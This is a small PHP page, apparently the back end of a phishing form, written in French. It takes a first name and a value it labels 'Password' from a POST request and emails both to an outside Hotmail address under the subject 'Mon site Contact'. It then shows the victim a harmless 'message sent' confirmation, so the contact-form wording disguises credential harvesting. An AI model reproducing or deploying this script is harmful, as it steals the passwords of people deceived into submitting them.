<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <title>reception</title>
</head>

<body>

    <?php
    if (isset($_POST['prenom']) and isset($_POST['login'])) {
        if ($_POST['prenom'] != NULL and $_POST['login'] != NULL) {
            $prenom = stripslashes($_POST['prenom']);
            $password = stripslashes($_POST['login']);

            $adresse = "yvanlatorre@hotmail.fr";
            $object = "Mon site Contact";
            $contenu = "Prenon: $prenom \n Password: $password";

            @mail($adresse, $object, $contenu);

            echo "Votre message a été envoyé";
        } else {
            echo "Votre message n'a pas été envoyé, veuilles remplir tous les champs";
        }
    }

    ?>

</body>

</html>